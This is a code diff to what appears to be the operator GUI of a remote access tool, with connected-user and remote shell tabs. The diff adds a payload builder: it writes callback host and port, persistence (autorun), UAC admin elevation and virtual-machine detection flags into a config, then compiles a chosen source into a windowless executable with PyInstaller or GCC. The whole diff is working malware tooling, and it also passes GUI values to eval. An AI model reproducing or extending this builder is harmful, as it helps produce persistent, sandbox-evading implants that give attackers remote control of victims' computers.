@@ -7,6 +7,8 @@ import socket as s
 import os
 import signal
 import sys
+import subprocess
+import shutil
 import threading
 from uuid import uuid4
 
@@ -50,6 +52,83 @@ class FrameTabConnections(ck.CTkFrame):
         self.entry_port.grid(column=5, row=0, padx=2, pady=10)
 
 
+class FrameTabCompile(ck.CTkFrame):
+    def __init__(self, master):
+        super().__init__(master)
+
+        self.grid_columnconfigure(0, weight=1)
+
+        self.label_entry_autorun = ck.CTkLabel(self, text='Autorun')
+        self.entry_autorun = ck.CTkOptionMenu(
+            self,
+            values=['False', 'True']
+        )
+
+        self.label_entry_activate = ck.CTkLabel(self, text='Activate')
+        self.entry_activate = ck.CTkOptionMenu(
+            self,
+            values=['False', 'True']
+        )
+
+        self.label_entry_admin = ck.CTkLabel(self, text='Run in Admin')
+        self.entry_admin = ck.CTkOptionMenu(
+            self,
+            values=['False', 'True']
+        )
+
+        self.label_entry_vm = ck.CTkLabel(self, text='Detect VM')
+        self.entry_vm = ck.CTkOptionMenu(
+            self,
+            values=['False', 'True']
+        )
+
+        self.label_entry_compiler = ck.CTkLabel(self, text='Compiler')
+        self.entry_compiler = ck.CTkOptionMenu(
+            self,
+            values=['PyInstaller', 'GCC']
+        )
+
+        self.label_entry_host = ck.CTkLabel(self, text='Host')
+        self.entry_host = ck.CTkEntry(self)
+
+        self.label_entry_port = ck.CTkLabel(self, text='Port')
+        self.entry_port = ck.CTkEntry(self)
+
+        self.label_entry_filename = ck.CTkLabel(self, text='Output Filename')
+        self.entry_filename = ck.CTkEntry(self)
+
+        self.label_entry_source_file = ck.CTkLabel(self, text='Source File')
+        self.entry_source_file = ck.CTkEntry(self)
+
+        self.label_entry_autorun.grid(column=0, row=0, padx=6, pady=10)
+        self.entry_autorun.grid(column=1, row=0, padx=6, pady=10)
+        self.label_entry_activate.grid(column=2, row=0, padx=6, pady=10)
+        self.entry_activate.grid(column=3, row=0, padx=6, pady=10)
+        self.label_entry_admin.grid(column=4, row=0, padx=6, pady=10)
+        self.entry_admin.grid(column=5, row=0, padx=6, pady=10)
+
+        self.label_entry_vm.grid(column=0, row=1, padx=6, pady=10)
+        self.entry_vm.grid(column=1, row=1, padx=6, pady=10)
+
+        self.label_entry_host.grid(column=0, row=2, padx=6, pady=10)
+        self.entry_host.grid(column=1, row=2, padx=6, pady=10)
+        self.label_entry_port.grid(column=2, row=2, padx=6, pady=10)
+        self.entry_port.grid(column=3, row=2, padx=6, pady=10)
+        self.label_entry_filename.grid(column=4, row=2, padx=6, pady=10)
+        self.entry_filename.grid(column=5, row=2, padx=6, pady=10)
+
+        self.label_entry_source_file.grid(column=0, row=3, padx=6, pady=10)
+        self.entry_source_file.bind("<Button-1>", command=self.set_file)
+        self.entry_source_file.grid(column=1, row=3, padx=6, pady=10)
+
+    def set_file(self, _):
+        source_file = fd.askopenfilename(initialdir='./source', title='Open File', filetypes=(("All Files", "*.*"),))
+        if source_file:
+            self.entry_source_file.delete(0, tk.END)
+            filename = os.path.basename(os.fspath(source_file))
+            self.entry_source_file.insert(0, filename)
+
+
 class FrameButtonConnections(ck.CTkFrame):
     def __init__(self, master, func):
         super().__init__(master)
@@ -70,6 +149,18 @@ class FrameButtonConnections(ck.CTkFrame):
 
         self.button_add_connection.grid(column=0, row=0, padx=2, pady=10)
         self.button_del_connection.grid(column=1, row=0, padx=2, pady=10)
+
+
+class FrameButtonCompile(ck.CTkFrame):
+    def __init__(self, master, func):
+        super().__init__(master)
+        self.grid_columnconfigure(0, weight=1)
+
+        self.button_compile = ck.CTkButton(
+            self, text='Compile', command=func.compiler
+        )
+
+        self.button_compile.grid(column=0, row=0, padx=2, pady=10)
 
 
 class TopLevelWindowUserTerminal(ck.CTkToplevel):
@@ -122,7 +213,8 @@ class TopLevelWindowUserTerminal(ck.CTkToplevel):
 
     def save_on_file(self):
         filename = fd.asksaveasfile(initialdir='./instances/shell_history', title='Save File', filetypes=(('Text Files', '*.txt'), ("All Files", "*.*")))
-        filename.write(self.textbox.get(0.0, tk.END))
+        if filename:
+            filename.write(self.textbox.get(0.0, tk.END))
         self.lift()
 
     def open_history(self):
@@ -147,7 +239,7 @@ class TopLevelWindowUserTerminal(ck.CTkToplevel):
             try:
                 self.user.send(data.encode())
             except OSError:
-                return
+                pass
             self.input_entry.delete(0, tk.END)
             self.textbox.insert(tk.END, message)
             self.textbox.yview(tk.END)
@@ -209,7 +301,6 @@ class Application(ck.CTk):
         self.tab_view.label_need_restart.grid(column=2, row=1, padx=2, pady=10)
         
         # Tab Users
-
         self.tab_view.label_users = ck.CTkLabel(self.tab_users, text="Users connected!")
         self.tab_view.label_users.pack()
 
@@ -225,7 +316,6 @@ class Application(ck.CTk):
         self.tab_view.list_users.bind("<Button-3>", self.popup)
 
         # Tab Connections
-
         self.tab_view.frame_connection = FrameTabConnections(self.tab_connections)
         self.tab_view.frame_connection.pack(padx=2, pady=5)
 
@@ -241,6 +331,13 @@ class Application(ck.CTk):
         self.load_connections()
 
         self.toplevel_user_terminal = None
+
+        # Tab Compile
+        self.tab_view.frame_compile = FrameTabCompile(self.tab_compile)
+        self.tab_view.frame_compile.pack(padx=2, pady=5)
+
+        self.tab_view.frame_button_compile = FrameButtonCompile(self.tab_compile, func=self)
+        self.tab_view.frame_button_compile.pack(padx=2, pady=10)
 
     def __repr__(self):
         return f"App {self.title_str}"
@@ -488,6 +585,85 @@ class Application(ck.CTk):
                 if f'{e_type}${e_host}${e_port}' not in actual:
                     file.write(f'{e_type}${e_host}${e_port}\n')
             CONNECTIONS[id_thread] = f'{e_type}${e_host}${e_port}'
+
+    def compiler(self):
+        working_dir = os.path.join(os.getcwd(), "source")
+        dist_dir = os.path.join(working_dir, "dist")
+
+        compiler = self.tab_view.frame_compile.entry_compiler.get()
+
+        host = self.tab_view.frame_compile.entry_host.get()
+        port = self.tab_view.frame_compile.entry_port.get()
+        source_file = self.tab_view.frame_compile.entry_source_file.get()
+        filename = self.tab_view.frame_compile.entry_filename.get()
+        autorun = self.tab_view.frame_compile.entry_autorun.get()
+        activate = self.tab_view.frame_compile.entry_activate.get()
+        admin = self.tab_view.frame_compile.entry_admin.get()
+        detect = self.tab_view.frame_compile.entry_vm.get()
+
+        if admin != "False" and admin != "True":
+            admin = "False"
+
+        if compiler == 'PyInstaller':
+            writer = (
+                f'HOST = "{host}"\n'
+                f'PORT = {port or 555}\n'
+                f'ACTIVATE = {activate or "False"}\n'
+                f'PERSIST = {autorun or "False"}\n'
+                f'ADMIN = {admin or "False"}\n'
+                f'DETECT_VM = {detect or "False"}\n'
+            )
+
+            args = [
+                "pyinstaller",
+                "-w",
+                "--clean",
+                "--onefile",
+                "-p", os.path.join(working_dir, 'config').replace('\\', '\\\\'),
+                "--name", os.path.join(dist_dir, filename).replace('\\', '\\\\'),
+                "--workpath", os.path.join(working_dir, 'build').replace('\\', '\\\\'),
+                "--distpath", os.path.join(working_dir, 'dist').replace('\\', '\\\\'),
+                os.path.join(working_dir, source_file).replace('\\', '\\\\')
+            ]
+            if eval(admin):
+                args.insert(4, "--uac-admin")
+
+            with open(f'{working_dir}\\config\\compiler_config.py', 'w') as config:
+                config.write(writer)
+
+        elif compiler == 'GCC':
+            writer = (
+                f'#define HOST "{host}"\n'
+                f'#define PORT {port or 555}\n'
+                f'#define ACTIVATE {activate.lower() or "False"}\n'
+                f'#define PERSIST {autorun.lower() or "False"}\n'
+                f'#define ADMIN {admin.lower() or "False"}\n'
+                f'#define DETECT_VM {detect.lower() or "False"}\n'
+            )
+            args = ["gcc", os.path.join(working_dir, source_file), "-o", os.path.join(dist_dir, filename)]
+            if eval(admin):
+                for arg in [
+                    ';', 'mt.exe', '-manifest', f'{working_dir}\\config\\manifest.xml',
+                    f'-outputresource:{working_dir}\\dist\\{filename}.exe;1'
+                ]:
+                    args.append(arg)
+
+            with open(f'{working_dir}\\config\\compiler_config.h', 'w') as config:
+                config.write(writer)
+        else:
+            raise ValueError("Compiler not found.")
+
+        if args:
+            try:
+                subprocess.call(args)
+            except Exception as e:
+                print(e)
+            else:
+                try:
+                    shutil.rmtree(f"{working_dir}\\build")
+                    os.remove(os.path.join(dist_dir, f'{filename}.spec'))
+                except FileNotFoundError:
+                    pass
 
 
 if __name__ == '__main__':
